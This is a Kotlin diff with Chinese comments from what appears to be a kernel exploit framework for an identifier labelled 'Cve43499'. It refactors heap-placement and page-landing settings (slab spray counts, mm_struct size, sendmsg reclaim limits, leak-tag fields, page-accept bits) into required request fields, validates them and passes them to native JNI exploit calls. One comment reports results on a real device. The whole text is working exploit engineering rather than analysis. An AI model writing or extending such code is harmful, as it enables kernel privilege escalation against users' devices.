@@ -23,13 +23,34 @@ internal data class PlacementConfig(
     val placementCpu: Int,
     val measurementCpu: Int,
     val timeoutNanos: Long,
-    val requiredAlignment: Long = Cve43499PhysicalConstants.ALLOCATION_SIZE_BYTES,
-    val scanLowerBound: Long =
-        Cve43499PhysicalConstants.SCAN_LOWER_BOUND_UNSIGNED.toLong(),
-    val scanUpperBound: Long =
-        Cve43499PhysicalConstants.SCAN_UPPER_BOUND_UNSIGNED.toLong(),
-    val scanStep: Long = Cve43499PhysicalConstants.SCAN_STEP_BYTES,
-    val scanRoundLimit: Long = Cve43499PhysicalConstants.SCAN_ROUND_LIMIT,
+    /* P0b：全部物理参数必填（Native 不回退默认值；缺失由调用方 fail-closed）。 */
+    val pageSize: Long,
+    val allocationSize: Long,
+    val slabOrder: Long,
+    val mmStructSize: Long,
+    val mmPartials: Long,
+    val prepareSlabs: Long,
+    val snitchCollisions: Long,
+    val pollUs: Long,
+    val requiredAlignment: Long,
+    val scanLowerBound: Long,
+    val scanUpperBound: Long,
+    val scanStep: Long,
+    val scanRoundLimit: Long,
+    val objectsPerSlab: Int,
+    val prepareObjectCount: Int,
+    val sprayObjectCount: Int,
+    val preObjectCount: Int,
+    val postObjectCount: Int,
+    /* R2（A 决策）：原 Native STRUCT_/WIRE_ 常量改为请求字段（必填）。 */
+    val identityStart: Long,
+    val identityEnd: Long,
+    val leakTagNibble: Long,
+    val leakTagShift: Long,
+    val stagingCapacity: Long,
+    val maxContextEntries: Long,
+    val maxObjectsPerSlab: Long,
+    val maxMeasurementRounds: Long,
 )
 
 /**
@@ -96,14 +117,23 @@ internal sealed interface LandingOutcome {
  * @property timeoutNanos landing 边界超时（Native 只做边界校验）。
  * @property socketSendBufferSize reclaim socket 的 SO_SNDBUF。
  * @property reclaimSendLimit reclaim `sendmsg` 次数上限。
+ * @property pageAcceptRequired 1 ⇒ 启用页接受判据；0 ⇒ 本 route 无判据。
+ * @property pageAcceptOffset 判据值对 candidatePageBase 的加数（legacy 0x100）。
+ * @property pageAcceptBit 判据值必须置位的 bit 下标（legacy 16）。
+ * @note R3a-2/B6：判据参数由 generator 依 write mode/preserve_child 计算后随请求
+ *   下传；Native 在提交点前求值，失败即拒绝（Placement 不消费）。
  */
 internal data class LandingConfig(
     val finalBytes: ByteArray,
     val contentGeneration: Long,
     val timeoutNanos: Long,
-    val socketSendBufferSize: Long =
-        Cve43499PhysicalConstants.RECLAIM_SOCKET_SEND_BUFFER_BYTES,
-    val reclaimSendLimit: Long = Cve43499PhysicalConstants.RECLAIM_SEND_LIMIT,
+    val socketSendBufferSize: Long,
+    val reclaimSendLimit: Long,
+    val reclaimPayloadSize: Long,
+    val fillByte: Long,
+    val pageAcceptRequired: Long,
+    val pageAcceptOffset: Long,
+    val pageAcceptBit: Long,
 )
 
 /**
@@ -161,10 +191,14 @@ internal class PlacementOwner private constructor(
             pageSize = facts.pageSize,
             allocationSize = facts.allocationSize,
             requiredAlignment = facts.requiredAlignment,
-            reclaimPayloadSize = Cve43499PhysicalConstants.RECLAIM_PAYLOAD_SIZE_BYTES,
+            reclaimPayloadSize = config.reclaimPayloadSize,
             socketSendBufferSize = config.socketSendBufferSize,
             reclaimSendLimit = config.reclaimSendLimit,
             timeoutNanos = config.timeoutNanos,
+            fillByte = config.fillByte,
+            pageAcceptRequired = config.pageAcceptRequired,
+            pageAcceptOffset = config.pageAcceptOffset,
+            pageAcceptBit = config.pageAcceptBit,
         )
         /* JNI 在进入 Native 事务前深拷贝 finalBytes；本调用不保留该数组引用。 */
         val pageToken = Native43499Jni.landPage(
@@ -259,18 +293,21 @@ internal class PlacementOwner private constructor(
      * @return null 表示通过；否则为具名 reason。
      */
     private fun precheckLanding(config: LandingConfig): String? {
-        if (config.finalBytes.size.toLong() !=
-            Cve43499PhysicalConstants.RECLAIM_PAYLOAD_SIZE_BYTES
+        /* P0b：全部来自请求；只校验自洽/非零，物理上限由 Native fail-closed。 */
+        if (config.reclaimPayloadSize <= 0L ||
+            config.finalBytes.size.toLong() != config.reclaimPayloadSize
         ) {
             return "landing-bytes-size:" + config.finalBytes.size
         }
         if (config.timeoutNanos <= 0L) return "landing-timeout-nanos"
-        if (config.socketSendBufferSize < 4_096L ||
-            config.socketSendBufferSize > (4L shl 20)
-        ) {
-            return "landing-socket-send-buffer"
+        if (config.socketSendBufferSize <= 0L) return "landing-socket-send-buffer"
+        if (config.reclaimSendLimit <= 0L) return "landing-reclaim-send-limit"
+        if (config.fillByte !in 0L..0xffL) return "landing-fill-byte"
+        /* R3a-2/B6：页接受判据域（0/1；启用时 bit 必须可移位；offset 允许 0）。 */
+        if (config.pageAcceptRequired !in 0L..1L) return "landing-page-accept-required"
+        if (config.pageAcceptRequired == 1L && config.pageAcceptBit !in 0L..63L) {
+            return "landing-page-accept-bit"
         }
-        if (config.reclaimSendLimit !in 1L..16L) return "landing-reclaim-send-limit"
         return null
     }
 
@@ -289,8 +326,8 @@ internal class PlacementOwner private constructor(
             val receipt = Native43499PlacementResult()
             val handle = Native43499Jni.preparePlacement(
                 Native43499PlacementRequest(
-                    pageSize = Cve43499PhysicalConstants.PAGE_SIZE_BYTES,
-                    allocationSize = Cve43499PhysicalConstants.ALLOCATION_SIZE_BYTES,
+                    pageSize = config.pageSize,
+                    allocationSize = config.allocationSize,
                     requiredAlignment = config.requiredAlignment,
                     scanLowerBound = config.scanLowerBound,
                     scanUpperBound = config.scanUpperBound,
@@ -299,11 +336,25 @@ internal class PlacementOwner private constructor(
                     timeoutNanos = config.timeoutNanos,
                     placementCpu = config.placementCpu,
                     measurementCpu = config.measurementCpu,
-                    objectsPerSlab = Cve43499PhysicalConstants.OBJECTS_PER_SLAB,
-                    prepareObjectCount = Cve43499PhysicalConstants.PREPARE_OBJECT_COUNT,
-                    sprayObjectCount = Cve43499PhysicalConstants.SPRAY_OBJECT_COUNT,
-                    preObjectCount = Cve43499PhysicalConstants.PRE_OBJECT_COUNT,
-                    postObjectCount = Cve43499PhysicalConstants.POST_OBJECT_COUNT,
+                    objectsPerSlab = config.objectsPerSlab,
+                    prepareObjectCount = config.prepareObjectCount,
+                    sprayObjectCount = config.sprayObjectCount,
+                    preObjectCount = config.preObjectCount,
+                    postObjectCount = config.postObjectCount,
+                    slabOrder = config.slabOrder,
+                    mmStructSize = config.mmStructSize,
+                    mmPartials = config.mmPartials,
+                    prepareSlabs = config.prepareSlabs,
+                    snitchCollisions = config.snitchCollisions,
+                    pollUs = config.pollUs,
+                    identityStart = config.identityStart,
+                    identityEnd = config.identityEnd,
+                    leakTagNibble = config.leakTagNibble,
+                    leakTagShift = config.leakTagShift,
+                    stagingCapacity = config.stagingCapacity,
+                    maxContextEntries = config.maxContextEntries,
+                    maxObjectsPerSlab = config.maxObjectsPerSlab,
+                    maxMeasurementRounds = config.maxMeasurementRounds,
                 ),
                 receipt,
             )
@@ -318,8 +369,8 @@ internal class PlacementOwner private constructor(
                 return PlacementPrepareOutcome.Refused(receipt.reason("preparePlacement"), receipt)
             }
             val factsMismatch = receipt.candidatePageBase == 0L ||
-                receipt.pageSize != Cve43499PhysicalConstants.PAGE_SIZE_BYTES ||
-                receipt.allocationSize != Cve43499PhysicalConstants.ALLOCATION_SIZE_BYTES ||
+                receipt.pageSize != config.pageSize ||
+                receipt.allocationSize != config.allocationSize ||
                 receipt.requiredAlignment != config.requiredAlignment
             if (factsMismatch) {
                 /* 事实与请求不一致：立即收回 token，禁止进入转移链。 */
@@ -327,7 +378,16 @@ internal class PlacementOwner private constructor(
                 Native43499Jni.closePlacement(handle, closeReceipt)
                 return PlacementPrepareOutcome.Refused("placement-facts-mismatch", receipt)
             }
-            return PlacementPrepareOutcome.Prepared(PlacementOwner(receipt), receipt)
+            /* G4L-5 线性 owner：Placement token 必须安装到新 owner；否则 landPage/close
+             * 都会看到 token=0（E1 真机 exposed：placement-not-open:PLACEMENT/OPEN）。
+             * install 失败则立即 close 回收，绝不泄漏 token。 */
+            val owner = PlacementOwner(receipt)
+            if (!owner.adoptToken(handle)) {
+                val closeReceipt = Native43499CloseResult()
+                Native43499Jni.closePlacement(handle, closeReceipt)
+                return PlacementPrepareOutcome.Refused("placement-adopt-failed", receipt)
+            }
+            return PlacementPrepareOutcome.Prepared(owner, receipt)
         }
 
         /**
@@ -338,38 +398,78 @@ internal class PlacementOwner private constructor(
          * @note 与 Native `glk43499_placement_validate` 同形，不新增策略。
          */
         private fun validate(config: PlacementConfig): String? {
+            /* P0b：全部来自请求；只做自洽/非零校验，物理上限交给 Native fail-closed。 */
             if (config.placementCpu < 0 || config.measurementCpu < 0) {
                 return "placement-cpu"
             }
             if (config.timeoutNanos <= 0L) return "placement-timeout-nanos"
+            if (config.pageSize <= 0L || config.allocationSize <= 0L ||
+                config.mmStructSize <= 0L || config.slabOrder < 0L
+            ) {
+                return "placement-page-geometry"
+            }
             val alignment = config.requiredAlignment
             if (alignment <= 0L || (alignment and (alignment - 1L)) != 0L ||
-                alignment > Cve43499PhysicalConstants.ALLOCATION_SIZE_BYTES
+                alignment > config.allocationSize ||
+                config.allocationSize % alignment != 0L
             ) {
-                return "placement-required-alignment"
-            }
-            if (Cve43499PhysicalConstants.ALLOCATION_SIZE_BYTES % alignment != 0L) {
                 return "placement-required-alignment"
             }
             val step = config.scanStep
             if (step <= 0L || (step and (step - 1L)) != 0L ||
-                step > Cve43499PhysicalConstants.ALLOCATION_SIZE_BYTES ||
-                Cve43499PhysicalConstants.ALLOCATION_SIZE_BYTES % step != 0L
+                step > config.allocationSize || config.allocationSize % step != 0L
             ) {
                 return "placement-scan-step"
             }
             if (config.scanLowerBound >= config.scanUpperBound) return "placement-scan-window"
-            if (config.scanLowerBound <
-                Cve43499PhysicalConstants.SCAN_LOWER_BOUND_UNSIGNED.toLong()
+            if (config.scanRoundLimit <= 0L) return "placement-scan-round-limit"
+            if (config.objectsPerSlab <= 0 || config.prepareObjectCount <= 0 ||
+                config.sprayObjectCount <= 0 || config.preObjectCount < 0 ||
+                config.postObjectCount <= 0
             ) {
-                return "placement-scan-lower-bound"
+                return "placement-object-counts"
             }
-            if (config.scanUpperBound >
-                Cve43499PhysicalConstants.SCAN_UPPER_BOUND_UNSIGNED.toLong()
+            if (config.mmPartials <= 0L || config.prepareSlabs <= 0L ||
+                config.snitchCollisions < 2L || config.pollUs < 0L
             ) {
-                return "placement-scan-upper-bound"
+                return "placement-slab-tuning"
             }
-            if (config.scanRoundLimit !in 1L..8L) return "placement-scan-round-limit"
+            /* R2（A 决策）：容量/协议字段自洽（与 Native 校验同形，不新增策略）。 */
+            if (config.stagingCapacity <= 0L ||
+                config.allocationSize > Long.MAX_VALUE / 2L ||
+                config.allocationSize * 2L > config.stagingCapacity
+            ) {
+                return "placement-staging-capacity"
+            }
+            if (config.maxContextEntries <= 0L || config.maxObjectsPerSlab <= 0L ||
+                config.maxMeasurementRounds <= 0L
+            ) {
+                return "placement-capacity-fields"
+            }
+            if (config.objectsPerSlab.toLong() > config.maxObjectsPerSlab) {
+                return "placement-max-objects-per-slab"
+            }
+            if (config.scanRoundLimit > config.maxMeasurementRounds) {
+                return "placement-max-measurement-rounds"
+            }
+            if (config.prepareObjectCount.toLong() > config.maxContextEntries ||
+                config.sprayObjectCount.toLong() > config.maxContextEntries ||
+                config.preObjectCount.toLong() > config.maxContextEntries ||
+                config.postObjectCount.toLong() > config.maxContextEntries
+            ) {
+                return "placement-max-context-entries"
+            }
+            if (config.leakTagNibble !in 0L..15L ||
+                config.leakTagShift !in 0L..63L
+            ) {
+                return "placement-leak-tag-domain"
+            }
+            if (config.identityEnd <= config.identityStart ||
+                config.identityStart < config.scanLowerBound ||
+                config.identityEnd > config.scanUpperBound
+            ) {
+                return "placement-identity-range"
+            }
             return null
         }
     }
